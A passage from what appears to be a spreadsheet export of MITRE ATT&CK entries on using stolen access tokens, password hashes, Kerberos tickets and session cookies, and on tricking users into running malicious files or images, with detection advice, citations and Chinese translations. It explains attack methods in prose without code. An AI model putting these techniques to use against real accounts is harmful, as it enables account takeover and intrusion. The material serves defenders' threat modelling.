OAuth is one commonly implemented framework that issues tokens to users for access to systems. These frameworks are used collaboratively to verify the user and determine what actions the user is allowed to perform. Once identity is established, the token allows actions to be authorized, without passing the actual credentials of the user. Therefore, compromise of the token can grant the adversary access to resources of other sites through a malicious application.(Citation: okta)

For example, with a cloud-based email service once an OAuth access token is granted to a malicious application, it can potentially gain long-term access to features of the user account if a ""refresh"" token enabling background access is awarded.(Citation: Microsoft Identity Platform Access 2019) With an OAuth access token an adversary can use the user-granted REST API to perform functions such as email searching and contact enumeration.(Citation: Staaldraad Phishing with OAuth 2017)

Compromised access tokens may be used as an initial step in compromising other services. For example, if a token grants access to a victim’s primary email, the adversary may be able to extend access to all other services which the target subscribes by triggering forgotten password routines. Direct API access through a token negates the effectiveness of a second authentication factor and may be immune to intuitive countermeasures like changing passwords. Access abuse over an API channel can be difficult to detect even from the service provider end, as the access can still align well with a legitimate workflow.",https://attack.mitre.org/techniques/T1550/001,30 January 2020,21 October 2022,1.4,"Defense Evasion, Lateral Movement","Monitor access token activity for abnormal use and permissions granted to unusual or suspicious applications and APIs. Additionally, administrators should review logs for calls to the AWS Security Token Service (STS) and usage of GCP service accounts in order to identify anomalous actions.(Citation: AWS Logging IAM Calls)(Citation: GCP Monitoring Service Account Usage)","Azure AD, Containers, Google Workspace, IaaS, Office 365, SaaS","Application Log: Application Log Content, Web Credential: Web Credential Usage",True,T1550,System Access Controls,"Ian Davila, Tidal Cyber; Jeff Sakowicz, Microsoft Identity Developer Platform Services (IDPM Services); Jen Burns, HubSpot; Mark Wee; Saisha Agrawal, Microsoft Threat Intelligent Center (MSTIC); Shailesh Tiwary (Indian Army)",,,,CAPEC-593,,,"(Citation: Microsoft POLONIUM June 2022),(Citation: Trend Micro Pawn Storm OAuth 2017),(Citation: Peirates GitHub),(Citation: CrowdStrike StellarParticle January 2022),(Citation: Microsoft Azure AD Admin Consent)",使用备用身份验证材料：应用程序访问令牌,攻击者可能会使用被盗的应用程序访问令牌绕过典型的身份验证过程并访问远程系统上的受限帐户、信息或服务。这些令牌通常是从用户或服务中窃取的，并用于代替登录凭据。应用程序访问令牌用于代表用户或服务发出授权的 API 请求，通常用作访问云和基于容器的应用程序和软件即服务 (SaaS) 中的资源的一种方式。（引用：Auth0 - 为什么你应该始终使用访问令牌来保护 API 2019 年 9 月）在 AWS 和 GCP 环境中，攻击者可以触发对具有另一个用户帐户权限的短期访问令牌的请求。（引用：谷歌云服务帐户凭据）（引文：AWS 临时安全凭证）然后攻击者可以使用此令牌来请求数据或执行原始账户无法执行的操作。如果此功能的权限配置错误 - 例如，通过允许所有用户为特定帐户请求令牌 - 攻击者可能能够获得对云帐户的初始访问权限或提升他们的权限。（引用：Rhino Security Labs Enumating AWS角色）OAuth 是一种常用的框架，它向用户颁发令牌以访问系统。这些框架共同用于验证用户并确定允许用户执行哪些操作。建立身份后，令牌允许授权操作，而无需传递用户的实际凭据。因此，令牌的泄露可以授予攻击者通过恶意应用程序访问其他站点资源的权限。（引用：okta）例如，使用基于云的电子邮件服务，一旦将 OAuth 访问令牌授予恶意应用程序，它就可以如果授予启用后台访问的“刷新”令牌，则可能获得对用户帐户功能的长期访问权限。（引用：Microsoft Identity Platform Access 2019）使用 OAuth 访问令牌，攻击者可以使用用户授予的 REST API 执行电子邮件搜索和联系人枚举等功能。（引用：使用 OAuth 2017 进行的 Staaldraad 网络钓鱼）受损的访问令牌可用作损害其他服务的初始步骤。例如，如果令牌授予对受害者主要电子邮件的访问权限，则攻击者可能能够通过触发忘记密码例程来扩展对目标订阅的所有其他服务的访问权限。通过令牌直接访问 API 会否定第二个身份验证因素的有效性，并且可能不受更改密码等直观对策的影响。即使从服务提供商端也很难检测到对 API 通道的访问滥用，因为访问仍然可以很好地与合法的工作流程保持一致。
T1550.002,Use Alternate Authentication Material: Pass the Hash,"Adversaries may “pass the hash” using stolen password hashes to move laterally within an environment, bypassing normal system access controls. Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash.

When performing PtH, valid password hashes for the account being used are captured using a [Credential Access](https://attack.mitre.org/tactics/TA0006) technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems.

Adversaries may also use stolen password hashes to ""overpass the hash."" Similar to PtH, this involves using a password hash to authenticate as a user but also uses the password hash to create a valid Kerberos ticket. This ticket can then be used to perform [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003) attacks.(Citation: Stealthbits Overpass-the-Hash)",https://attack.mitre.org/techniques/T1550/002,30 January 2020,31 August 2021,1.1,"Defense Evasion, Lateral Movement","Audit all logon and credential use events and review for discrepancies. Unusual remote logins that correlate with other suspicious activity (such as writing and executing binaries) may indicate malicious activity. NTLM LogonType 3 authentications that are not associated to a domain login and are not anonymous logins are suspicious.

Event ID 4768 and 4769 will also be generated on the Domain Controller when a user requests a new ticket granting ticket or service ticket. These events combined with the above activity may be indicative of an overpass the hash attempt.(Citation: Stealthbits Overpass-the-Hash)",Windows,"Active Directory: Active Directory Credential Request, Logon Session: Logon Session Creation, User Account: User Account Authentication",True,T1550,System Access Controls,"Blake Strom, Microsoft 365 Defender; Travis Smith, Tripwire",,,,CAPEC-644,,,"(Citation: Cobalt Strike TTPs Dec 2017),(Citation: Adsecurity Mimikatz Guide),(Citation: NCC Group Chimera January 2021),(Citation: McAfee Night Dragon),(Citation: Cybereason Cobalt Kitty 2017),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: Mandiant APT1),(Citation: CISA AA20-301A Kimsuky),(Citation: US-CERT HOPLIGHT Apr 2019),(Citation: Microsoft SIR Vol 19),(Citation: NCSC Joint Report Public Tools),(Citation: Github PowerShell Empire),(Citation: CME Github September 2018),(Citation: Cybereason Soft Cell June 2019),(Citation: GitHub PoshC2),(Citation: NSA Spotting),(Citation: GitHub IAD Secure Host Baseline UAC Filtering)",使用备用身份验证材料：通过哈希,攻击者可能会使用窃取的密码哈希“传递哈希”在环境中横向移动，绕过正常的系统访问控制。传递散列 (PtH) 是一种无需访问用户明文密码即可以用户身份进行身份验证的方法。此方法绕过需要明文密码的标准身份验证步骤，直接进入使用密码哈希的身份验证部分。执行 PtH 时，使用 [Credential Access](https://attack.mitre.org/tactics/TA0006) 技术捕获正在使用的帐户的有效密码哈希。捕获的哈希与 PtH 一起用于验证该用户的身份。一旦通过身份验证，PtH 可用于在本地或远程系统上执行操作。攻击者也可能使用窃取的密码散列来“超越散列”。与 PtH 类似，这涉及使用密码哈希来验证用户身份，但也使用密码哈希来创建有效的 Kerberos 票证。然后可以使用此票证执行 [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003) 攻击。（引用：Stealthbits Overpass-the-Hash）
T1550.003,Use Alternate Authentication Material: Pass the Ticket,"Adversaries may “pass the ticket” using stolen Kerberos tickets to move laterally within an environment, bypassing normal system access controls. Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account's password. Kerberos authentication can be used as the first step to lateral movement to a remote system.

When preforming PtT, valid Kerberos tickets for [Valid Accounts](https://attack.mitre.org/techniques/T1078) are captured by [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). A user's service tickets or ticket granting ticket (TGT) may be obtained, depending on the level of access. A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access.(Citation: ADSecurity AD Kerberos Attacks)(Citation: GentilKiwi Pass the Ticket)

A [Silver Ticket](https://attack.mitre.org/techniques/T1558/002) can be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint).(Citation: ADSecurity AD Kerberos Attacks)

A [Golden Ticket](https://attack.mitre.org/techniques/T1558/001) can be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory.(Citation: Campbell 2014)

Adversaries may also create a valid Kerberos ticket using other user information, such as stolen password hashes or AES keys. For example, ""overpassing the hash"" involves using a NTLM password hash to authenticate as a user (i.e. [Pass the Hash](https://attack.mitre.org/techniques/T1550/002)) while also using the password hash to create a valid Kerberos ticket.(Citation: Stealthbits Overpass-the-Hash)",https://attack.mitre.org/techniques/T1550/003,30 January 2020,31 August 2021,1.1,"Defense Evasion, Lateral Movement","Audit all Kerberos authentication and credential use events and review for discrepancies. Unusual remote authentication events that correlate with other suspicious activity (such as writing and executing binaries) may indicate malicious activity.

Event ID 4769 is generated on the Domain Controller when using a golden ticket after the KRBTGT password has been reset twice, as mentioned in the mitigation section. The status code 0x1F indicates the action has failed due to ""Integrity check on decrypted field failed"" and indicates misuse by a previously invalidated golden ticket.(Citation: CERT-EU Golden Ticket Protection)",Windows,"Active Directory: Active Directory Credential Request, Logon Session: Logon Session Creation, User Account: User Account Authentication",True,T1550,System Access Controls,Ryan Becwar; Vincent Le Toux,,,Kerberos authentication enabled,CAPEC-645,,,"(Citation: Adsecurity Mimikatz Guide),(Citation: GitHub Pupy),(Citation: Cybereason Cobalt Kitty 2017),(Citation: AdSecurity Kerberos GT Aug 2015),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: Mandiant No Easy Breach),(Citation: NCSC Joint Report Public Tools),(Citation: Symantec Seaduke 2015),(Citation: Harmj0y DCSync Sept 2015),(Citation: ADSecurity Kerberos and KRBTGT),(Citation: STIG krbtgt reset),(Citation: ADSecurity AD Kerberos Attacks)",使用备用身份验证材料：通过票证,攻击者可能会使用被盗的 Kerberos 票证“通过票证”在环境中横向移动，从而绕过正常的系统访问控制。传递票证 (PtT) 是一种使用 Kerberos 票证对系统进行身份验证的方法，无需访问帐户密码。 Kerberos 身份验证可用作横向移动到远程系统的第一步。在执行 PtT 时，[有效帐户](https://attack.mitre.org/techniques/T1078) 的有效 Kerberos 票证由 [OS 凭证转储](https://attack.mitre.org/techniques/T1003) 捕获.取决于访问级别，可以获得用户的服务票证或票证授予票证 (TGT)。服务票证允许访问特定资源，而 TGT 可用于从票证授予服务 (TGS) 请求服务票证，以访问用户有权访问的任何资源。（引文：ADSecurity AD Kerberos 攻击）（引文: GentilKiwi Pass the Ticket) [Silver Ticket](https://attack.mitre.org/techniques/T1558/002) 可以获得使用 Kerberos 作为身份验证机制的服务，并用于生成访问该特定服务的票证资源和托管资源的系统（例如，SharePoint）。（引用：ADSecurity AD Kerberos 攻击）可以获得域的 [Golden Ticket](https://attack.mitre.org/techniques/T1558/001)使用密钥分发服务帐户 KRBTGT 帐户 NTLM 哈希，它可以为 Active Directory 中的任何帐户生成 TGT。（引用：Campbell 2014）攻击者还可以使用其他用户信息创建有效的 Kerberos 票证，例如被盗的密码哈希或 AES 密钥.例如，“越过哈希”涉及使用 NTLM 密码哈希来验证用户身份（即 [Pass the Hash](https://attack.mitre.org/techniques/T1550/002)），同时还使用密码哈希创建有效的 Kerberos 票证。（引用：Stealthbits Overpass-the-Hash）
T1550.004,Use Alternate Authentication Material: Web Session Cookie,"Adversaries can use stolen session cookies to authenticate to web applications and services. This technique bypasses some multi-factor authentication protocols since the session is already authenticated.(Citation: Pass The Cookie)

Authentication cookies are commonly used in web applications, including cloud-based services, after a user has authenticated to the service so credentials are not passed and re-authentication does not need to occur as frequently. Cookies are often valid for an extended period of time, even if the web application is not actively used. After the cookie is obtained through [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539) or [Web Cookies](https://attack.mitre.org/techniques/T1606/001), the adversary may then import the cookie into a browser they control and is then able to use the site or application as the user for as long as the session cookie is active. Once logged into the site, an adversary can access sensitive information, read email, or perform actions that the victim account has permissions to perform.

There have been examples of malware targeting session cookies to bypass multi-factor authentication systems.(Citation: Unit 42 Mac Crypto Cookies January 2019)",https://attack.mitre.org/techniques/T1550/004,30 January 2020,12 October 2021,1.3,"Defense Evasion, Lateral Movement",Monitor for anomalous access of websites and cloud-based applications by the same user in different locations or by different systems that do not match expected configurations.,"Google Workspace, IaaS, Office 365, SaaS","Application Log: Application Log Content, Web Credential: Web Credential Usage",True,T1550,System Access Controls,"Jen Burns, HubSpot; Johann Rehberger",,,,CAPEC-60,,,"(Citation: Volexity SolarWinds),(Citation: CrowdStrike StellarParticle January 2022),",使用备用身份验证材料：Web 会话 Cookie,攻击者可以使用窃取的会话 cookie 对 Web 应用程序和服务进行身份验证。这种技术绕过了一些多因素身份验证协议，因为会话已经过身份验证。（引用：传递 Cookie）身份验证 cookie 通常用于 Web 应用程序，包括基于云的服务，在用户对服务进行身份验证后，因此凭据不会通过和重新认证不需要频繁发生。 Cookie 通常会在很长一段时间内有效，即使 Web 应用程序没有被积极使用。通过[Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)或[Web Cookies](https://attack.mitre.org/techniques/T1606/001)获取cookie后，然后，攻击者可以将 cookie 导入到他们控制的浏览器中，然后只要会话 cookie 处于活动状态，就能够以用户身份使用站点或应用程序。登录该站点后，攻击者可以访问敏感信息、阅读电子邮件或执行受害者帐户有权执行的操作。有一些针对会话 cookie 的恶意软件示例绕过多因素身份验证系统。（引用：Unit 42 Mac Crypto Cookies January 2019）
T1204,User Execution,"An adversary may rely upon specific actions by a user in order to gain execution. Users may be subjected to social engineering to get them to execute malicious code by, for example, opening a malicious document file or link. These user actions will typically be observed as follow-on behavior from forms of [Phishing](https://attack.mitre.org/techniques/T1566).

While [User Execution](https://attack.mitre.org/techniques/T1204) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).

Adversaries may also deceive users into performing actions such as enabling [Remote Access Software](https://attack.mitre.org/techniques/T1219), allowing direct control of the system to the adversary, or downloading and executing malware for [User Execution](https://attack.mitre.org/techniques/T1204). For example, tech support scams can be facilitated through [Phishing](https://attack.mitre.org/techniques/T1566), vishing, or various forms of user interaction. Adversaries can use a combination of these methods, such as spoofing and promoting toll-free numbers or call centers that are used to direct victims to malicious websites, to deliver and execute payloads containing malware or [Remote Access Software](https://attack.mitre.org/techniques/T1219).(Citation: Telephone Attack Delivery)",https://attack.mitre.org/techniques/T1204,18 April 2018,19 April 2022,1.5,Execution,"Monitor the execution of and command-line arguments for applications that may be used by an adversary to gain Initial Access that require user interaction. This includes compression applications, such as those for zip files, that can be used to [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) in payloads.

Anti-virus can potentially detect malicious documents and files that are downloaded and executed on the user's computer. Endpoint sensing or network sensing can potentially detect malicious events once the file is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning powershell.exe).","Containers, IaaS, Linux, Windows, macOS","Application Log: Application Log Content, Command: Command Execution, Container: Container Creation, Container: Container Start, File: File Creation, Image: Image Creation, Instance: Instance Creation, Instance: Instance Start, Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Process: Process Creation",False,,,"Oleg Skulkin, Group-IB",,0.0,,,,,"(Citation: MSTIC DEV-0537 Mar 2022),(Citation: win10_asr)",用户执行,攻击者可能会依赖用户的特定操作来获得执行。用户可能会受到社会工程的影响，以使他们通过例如打开恶意文档文件或链接来执行恶意代码。这些用户操作通常会被视为 [网络钓鱼] (https://attack.mitre.org/techniques/T1566) 形式的后续行为。虽然 [用户执行](https://attack.mitre.org/techniques/T1204) 经常在初始访问后不久发生，但它可能发生在入侵的其他阶段，例如当对手将文件放在共享目录或用户的桌面，希望用户点击它。在 [Internal Spearphishing](https://attack.mitre.org/techniques/T1534) 之后不久也可能会看到此活动。攻击者还可能欺骗用户执行诸如启用[远程访问软件](https://attack.mitre.org/techniques/T1219)、允许攻击者直接控制系统或为[用户执行](https://attack.mitre.org/techniques/T1204)。例如，可以通过 [网络钓鱼](https://attack.mitre.org/techniques/T1566)、网络钓鱼或各种形式的用户交互来促进技术支持诈骗。攻击者可以使用这些方法的组合，例如欺骗和推广用于将受害者引导至恶意网站的免费电话号码或呼叫中心，以传递和执行包含恶意软件或 [远程访问软件](https://attack) 的有效负载.mitre.org/techniques/T1219）。（引文：电话攻击传递）
T1204.002,User Execution: Malicious File,"An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001). Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.

Adversaries may employ various forms of [Masquerading](https://attack.mitre.org/techniques/T1036) and [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it.(Citation: Password Protected Word Docs) 

While [Malicious File](https://attack.mitre.org/techniques/T1204/002) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).",https://attack.mitre.org/techniques/T1204/002,11 March 2020,20 May 2022,1.2,Execution,"Monitor the execution of and command-line arguments for applications that may be used by an adversary to gain initial access that require user interaction. This includes compression applications, such as those for zip files, that can be used to [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) in payloads.

Anti-virus can potentially detect malicious documents and files that are downloaded and executed on the user's computer. Endpoint sensing or network sensing can potentially detect malicious events once the file is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning powershell.exe).","Linux, Windows, macOS","File: File Creation, Process: Process Creation",True,T1204,,TruKno,,0.0,,,,,"(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: CSM Elderwood Sept 2012),(Citation: Unit 42 Gorgon Group Aug 2018),(Citation: Uptycs Confucius APT Jan 2021),(Citation: FireEye Fin8 May 2016),(Citation: Cyberreason Anchor December 2019),(Citation: FireEye Obfuscation June 2017),(Citation: Cybereason Valak May 2020),(Citation: Cylance Shaheen Nov 2018),(Citation: Symantec Inception Framework March 2018),(Citation: SentinelOne Aoqin Dragon June 2022),(Citation: ESET Gamaredon June 2020),(Citation: IBM Grandoreiro April 2020),(Citation: McAfee Bankshot),(Citation: Medium Ali Salem Bumblebee April 2022),(Citation: Symantec Tick Apr 2016),(Citation: TrendMicro Taidoor),(Citation: ATT QakBot April 2021),(Citation: FireEye Hacking FIN4 Dec 2014),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: Checkpoint Dridex Jan 2021),(Citation: Trend Micro Tick November 2019),(Citation: Securelist Octopus Oct 2018),(Citation: CISA AA20-301A Kimsuky),(Citation: Symantec Whitefly March 2019),(Citation: Unit 42 Inception November 2018),(Citation: ESET OceanLotus Mar 2019),(Citation: Trend Micro Banking Malware Jan 2019),(Citation: Carbon Black Shlayer Feb 2019),(Citation: Kaspersky QakBot September 2021),(Citation: Talos Promethium June 2020),(Citation: Bitdefender StrongPity June 2020),(Citation: Microsoft DUBNIUM July 2016),(Citation: Symantec Elderwood Sept 2012),(Citation: Cylance Machete Mar 2017),(Citation: Securelist Darkhotel Aug 2015),(Citation: Group IB Ransomware September 2020),(Citation: AhnLab Andariel Subgroup of Lazarus June 2018),(Citation: Malwarebytes Kimsuky June 2021),(Citation: ESET Operation Spalax Jan 2021),(Citation: Volexity Patchwork June 2018),(Citation: Cybereason Chaes Nov 2020),(Citation: FireEye Metamorfo Apr 2018),(Citation: Secureworks IRON HEMLOCK Profile),(Citation: FireEye APT10 April 2017),(Citation: Dragos Hexane),(Citation: Carbon Black JCry May 2019),(Citation: Unit 42 DarkHydrus July 2018),(Citation: Gigamon Berserk Bear October 2021),(Citation: Talos Lokibot Jan 2021),(Citation: Symantec Shuckworm January 2022),(Citation: Google EXOTIC LILY March 2022),(Citation: Unit 42 Sofacy Feb 2018),(Citation: Trend Micro DRBControl February 2020),(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022),(Citation: FireEye Hacking FIN4 Video Dec 2014),(Citation: Proofpoint TA459 April 2017),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: Unit 42 Cobalt Gang Oct 2018),(Citation: Rewterz Sidewinder APT April 2020),(Citation: FireEye admin@338),(Citation: Crowdstrike Qakbot October 2020),(Citation: US-CERT BLINDINGCAN Aug 2020),(Citation: Kaspersky Transparent Tribe August 2020),(Citation: Cyber Forensicator Silence Jan 2019),(Citation: Unit 42 ProjectM March 2016),(Citation: Proofpoint TA505 Jan 2019),(Citation: DFIR Conti Bazar Nov 2021),(Citation: Rewterz Sidewinder COVID-19 June 2020),(Citation: Carbon Black Emotet Apr 2019),(Citation: ThreatConnect Kimsuky September 2020),(Citation: US-CERT TYPEFRAME June 2018),(Citation: Reaqta MuddyWater November 2017),(Citation: Unit 42 CARROTBAT January 2020),(Citation: SecureWorks August 2019),(Citation: Zscaler Higaisa 2020),(Citation: ClearSky MuddyWater June 2019),(Citation: CrowdStrike Wizard Spider October 2020),(Citation: McAfee Sharpshooter December 2018),(Citation: CheckPoint Naikon May 2020),(Citation: ESET Bad Rabbit),(Citation: MSTIC Nobelium Toolset May 2021),(Citation: Unit42 Molerat Mar 2020),(Citation: HackerNews IndigoZebra July 2021),(Citation: Unit 42 Valak July 2020),(Citation: IBM IcedID November 2017),(Citation: Unit42 Redaman January 2019),(Citation: Unit 42 OopsIE! Feb 2018),(Citation: Kaspersky ThreatNeedle Feb 2021),(Citation: Unit 42 Playbook Dec 2017),(Citation: FBI FLASH APT39 September 2020),(Citation: Kaspersky Cloud Atlas August 2019),(Citation: CERT-EE Gamaredon January 2021),(Citation: Malwarebytes Pony April 2016),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: Cybereason Oceanlotus May 2017),(Citation: Talos Bisonal Mar 2020),(Citation: FireEye APT19),(Citation: QiAnXin APT-C-36 Feb2019),(Citation: Cybereason Kimsuky November 2020),(Citation: 360 Machete Sep 2020),(Citation: Zscaler Lyceum DnsSystem June 2022),(Citation: Antiy CERT Ramsay April 2020),(Citation: Proofpoint TA505 October 2019),(Citation: Trend Micro Qakbot December 2020),(Citation: Recorded Future REDDELTA July 2020),(Citation: TrendMicro Trickbot Feb 2019),(Citation: Intego Shlayer Feb 2018),(Citation: TrendMicro Msiexec Feb 2018),(Citation: G Data Sodinokibi June 2019),(Citation: Accenture MUDCARP March 2019),(Citation: Avira Mustang Panda January 2020),(Citation: Forcepoint BITTER Pakistan Oct 2016),(Citation: Cyble Sidewinder September 2020),(Citation: Flashpoint FIN 7 March 2019),(Citation: CrowdStrike Grim Spider May 2019),(Citation: Check Point APT34 April 2021),(Citation: McAfee Honeybee),(Citation: Symantec Chafer February 2018),(Citation: eSentire FIN7 July 2021),(Citation: Unit 42 TA551 Jan 2021),(Citation: Proofpoint Bumblebee April 2022),(Citation: IBM TA505 April 2020),(Citation: Secureworks IRON TWILIGHT Active Measures March 2017),(Citation: Cisco Talos Bitter Bangladesh May 2022),(Citation: Microsoft PLATINUM April 2016),(Citation: Proofpoint TA505 June 2018),(Citation: CheckPoint Bandook Nov 2020),(Citation: ESET T3 Threat Report 2021),(Citation: Lookout Dark Caracal Jan 2018),(Citation: TrendMicro Patchwork Dec 2017),(Citation: Malwarebytes Konni Aug 2021),(Citation: Cylance Dust Storm),(Citation: Microsoft Actinium February 2022),(Citation: FireEye APT37 Feb 2018),(Citation: Kaspersky Cloud Atlas December 2014),(Citation: Proofpoint TA416 Europe March 2022),(Citation: MalwareBytes SideCopy Dec 2021),(Citation: Trend Micro IXESHE 2012),(Citation: Talos Transparent Tribe May 2021),(Citation: Unit 42 QUADAGENT July 2018),(Citation: McAfee REvil October 2019),(Citation: Talos MuddyWater May 2019),(Citation: FireEye APT32 April 2020),(Citation: Malwarebytes Higaisa 2020),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: Securelist Brazilian Banking Malware July 2020),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: Picus Sodinokibi January 2020),(Citation: Kroll Qakbot June 2020),(Citation: Check Point Warzone Feb 2020),(Citation: Crowdstrike Helix Kitten Nov 2018),(Citation: Lazarus APT January 2022),(Citation: Mandiant UNC3890 Aug 2022),(Citation: ZScaler Squirrelwaffle Sep 2021),(Citation: Symantec Gallmaker Oct 2018),(Citation: Securelist MuddyWater Oct 2018),(Citation: ATT Sidewinder January 2021),(Citation: ProofPoint SettingContent-ms July 2018),(Citation: Accenture SNAKEMACKEREL Nov 2018),(Citation: Unit 42 CARROTBAT November 2018),(Citation: Symantec Bumblebee June 2022),(Citation: Proofpoint NETWIRE December 2020),(Citation: Talos Oblique RAT March 2021),(Citation: ESET InvisiMole June 2020),(Citation: BitDefender Chafer May 2020),(Citation: Proofpoint TA505 Mar 2018),(Citation: FireEye NETWIRE March 2019),(Citation: Trend Micro Qakbot May 2020),(Citation: Kaspersky Ferocious Kitten Jun 2021),(Citation: CISA AppleJeus Feb 2021),(Citation: FireEye MuddyWater Mar 2018),(Citation: Unit 42 Gamaredon February 2022),(Citation: Proofpoint TA505 Sep 2017),(Citation: CISA AA20-239A BeagleBoyz August 2020),(Citation: FOX-IT May 2016 Mofang),(Citation: ESET OceanLotus),(Citation: Kaspersky MoleRATs April 2019),(Citation: Group IB Silence Sept 2018),(Citation: Microsoft Holmium June 2020),(Citation: MacKeeper Bundlore Apr 2019),(Citation: Talos Kimsuky Nov 2021),(Citation: ESET Telebots Dec 2016),(Citation: CrowdStrike Carbon Spider August 2021),(Citation: FireEye APT29 Nov 2018),(Citation: NTT Security Flagpro new December 2021),(Citation: Visa FIN6 Feb 2019),(Citation: Securelist Machete Aug 2014),(Citation: ESET Dukes October 2019),(Citation: FireEye Hancitor),(Citation: SentinelOne Valak June 2020),(Citation: Symantec WastedLocker June 2020),(Citation: Anomali MUSTANG PANDA October 2019),(Citation: Group IB RTM August 2019),(Citation: Google TAG Ukraine Threat Landscape March 2022),(Citation: Trend Micro TA505 June 2019),(Citation: F-Secure The Dukes),(Citation: Cybereason TA505 April 2019),(Citation: District Court of NY APT10 Indictment December 2018),(Citation: Talos PoetRAT April 2020),(Citation: Crowdstrike MUSTANG PANDA June 2018),(Citation: Rancor Unit42 June 2018),(Citation: SecureList Silence Nov 2017),(Citation: Malwarebytes RokRAT VBA January 2021),(Citation: FireEye APT30),(Citation: ClearSky Siamesekitten August 2021),(Citation: Secureworks IRON TILDEN Profile),(Citation: Secure List Bad Rabbit),(Citation: Unit 42 NETWIRE April 2020),(Citation: Talos Frankenstein June 2019),(Citation: FireEye APT39 Jan 2019),(Citation: Unit 42 MuddyWater Nov 2017),(Citation: Qualys LolZarus),(Citation: Cybereason Bumblebee August 2022),(Citation: ESET Machete July 2019),(Citation: TrendMicro BlackTech June 2017),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: Talos MuddyWater Jan 2022),(Citation: TrendMicro EarthLusca 2022),(Citation: FireEye FIN7 April 2017),(Citation: Kaspersky WIRTE November 2021),(Citation: VirusBulletin Kimsuky October 2019),(Citation: Proofpoint Leviathan Oct 2017),(Citation: ESET Casbaneiro Oct 2019),(Citation: Malwarebytes Saint Bot April 2021),(Citation: Unit 42 KerrDown February 2019),(Citation: Talos Cobalt Group July 2018),(Citation: FireEye APT10 Sept 2018),(Citation: Moran 2014),(Citation: Anomali Static Kitten February 2021),(Citation: TrendMicro Tonto Team October 2020),(Citation: FireEye Operation Saffron Rose 2013),(Citation: ClearSky Lazarus Aug 2020),(Citation: ESET Nomadic Octopus 2018),(Citation: Accenture Hogfish April 2018),(Citation: Cybereason Molerats Dec 2020),(Citation: ClearSky Kittens Back 3 August 2020),(Citation: CISA AA21-200A APT40 July 2021),(Citation: Trend Micro Muddy Water March 2021),(Citation: TrendMicro Gamaredon April 2020),(Citation: PaloAlto CardinalRat Apr 2017),(Citation: Juniper IcedID June 2020),(Citation: Amnesty Intl. Ocean Lotus February 2021),(Citation: Anomali Pirate Panda April 2020),(Citation: Carbon Black HotCroissant April 2020),(Citation: SANS Windshift August 2018),(Citation: Bitdefender Agent Tesla April 2020),(Citation: Cyberint Qakbot May 2021),(Citation: Netskope Squirrelwaffle Oct 2021),(Citation: win10_asr)",用户执行：恶意文件,攻击者可能依赖用户打开恶意文件以获得执行。用户可能会受到社会工程的影响，以使他们打开将导致代码执行的文件。此用户操作通常会被视为 [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) 的后续行为。攻击者可能使用需要用户执行的多种类型的文件，包括 .doc、.pdf、.xls、.rtf、.scr、.exe、.lnk、.pif 和 .cpl。攻击者可能会使用各种形式的 [伪装](https://attack.mitre.org/techniques/T1036) 和 [混淆文件或信息](https://attack.mitre.org/techniques/T1027) 来增加可能性用户将打开并成功执行恶意文件。这些方法可能包括使用熟悉的命名约定和/或密码保护文件并向用户提供有关如何打开文件的说明。（引文：受密码保护的 Word 文档）而 [恶意文件](https://attack.mitre. org/techniques/T1204/002) 经常发生在初始访问后不久，它可能发生在入侵的其他阶段，例如当攻击者将文件放在共享目录或用户桌面上希望用户点击它时。在 [Internal Spearphishing](https://attack.mitre.org/techniques/T1534) 之后不久也可能会看到此活动。
T1204.003,User Execution: Malicious Image,"Adversaries may rely on a user running a malicious image to facilitate execution. Amazon Web Services (AWS) Amazon Machine Images (AMIs), Google Cloud Platform (GCP) Images, and Azure Images as well as popular container runtimes such as Docker can be backdoored. Backdoored images may be uploaded to a public repository via [Upload Malware](https://attack.mitre.org/techniques/T1608/001), and users may then download and deploy an instance or container from the image without realizing the image is malicious, thus bypassing techniques that specifically achieve Initial Access. This can lead to the execution of malicious code, such as code that executes cryptocurrency mining, in the instance or container.(Citation: Summit Route Malicious AMIs)

